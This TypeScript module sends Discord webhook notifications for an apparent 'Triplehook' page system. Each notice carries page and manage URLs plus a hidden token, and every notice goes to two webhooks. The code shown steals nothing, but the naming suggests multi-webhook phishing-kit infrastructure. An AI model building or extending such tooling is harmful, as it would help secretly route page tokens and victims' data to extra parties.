interface DiscordEmbed {
  title: string;
  description?: string;
  color?: number;
  fields?: Array<{
    name: string;
    value: string;
    inline?: boolean;
  }>;
  footer?: {
    text: string;
  };
  timestamp?: string;
}

interface WebhookPayload {
  content?: string;
  embeds?: DiscordEmbed[];
}

export async function sendWebhookNotification(
  webhookUrl: string,
  payload: WebhookPayload
): Promise<boolean> {
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      console.error('[v0] Webhook notification failed:', response.statusText);
      return false;
    }

    return true;
  } catch (err) {
    console.error('[v0] Failed to send webhook notification:', err);
    return false;
  }
}

export function createTriplehookNotification(
  directory: string,
  webhookUrl: string,
  token: string,
  domain: string,
  mode: 'created' | 'deleted' | 'updated' = 'created'
): WebhookPayload {
  const pageUrl = `https://${domain}/triplehook/${directory}`;
  const manageUrl = `https://${domain}/triplehook/manage/${directory}`;

  const embed: DiscordEmbed = {
    title: `Triplehook ${mode.charAt(0).toUpperCase() + mode.slice(1)}`,
    color: mode === 'created' ? 3447003 : mode === 'deleted' ? 15158332 : 10181046,
    fields: [
      {
        name: 'Directory',
        value: `\`${directory}\``,
        inline: true,
      },
      {
        name: 'Mode',
        value: '`TRIPLEHOOK`',
        inline: true,
      },
      {
        name: 'Page URL',
        value: pageUrl,
        inline: false,
      },
      {
        name: 'Manage URL',
        value: manageUrl,
        inline: false,
      },
      {
        name: 'Token',
        value: `||${token}||`,
        inline: false,
      },
    ],
    footer: {
      text: 'ImHellAMo Triplehook System',
    },
    timestamp: new Date().toISOString(),
  };

  return {
    embeds: [embed],
  };
}

export async function notifyBothWebhooks(
  webhook1: string,
  webhook2: string,
  directory: string,
  token: string,
  domain: string,
  mode: 'created' | 'deleted' | 'updated' = 'created'
): Promise<{ webhook1Success: boolean; webhook2Success: boolean }> {
  const notification = createTriplehookNotification(directory, webhook1, token, domain, mode);

  const [webhook1Success, webhook2Success] = await Promise.all([
    sendWebhookNotification(webhook1, notification),
    sendWebhookNotification(webhook2, notification),
  ]);

  return { webhook1Success, webhook2Success };
}
